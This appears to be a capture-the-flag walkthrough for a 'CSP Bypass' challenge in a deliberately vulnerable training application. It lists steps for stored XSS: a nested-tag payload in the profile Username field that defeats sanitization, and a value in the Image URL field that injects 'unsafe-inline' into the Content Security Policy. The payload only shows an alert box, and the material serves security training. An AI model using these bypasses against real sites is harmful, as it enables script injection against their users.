## CSP Bypass
### Challenge: Bypass the Content Security Policy and perform an XSS attack with \<script\>alert(`xss`)\</script\> on a legacy page within the application.

1. Login as any user
2. Visit the profile page
3. Enter \<script\>alert(`xss`)\</script\> in the Username field to confirm sanitization
4. Enter \<\<a|ascript\>alert(`xss`)\</script\> in the Username field to bypass sanitization
5. Add `unsafe-inline` to the Image URL to bypass CSP
  `https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com`
6. Refresh the page to see alert box
7. Visit homepage to solve challenge
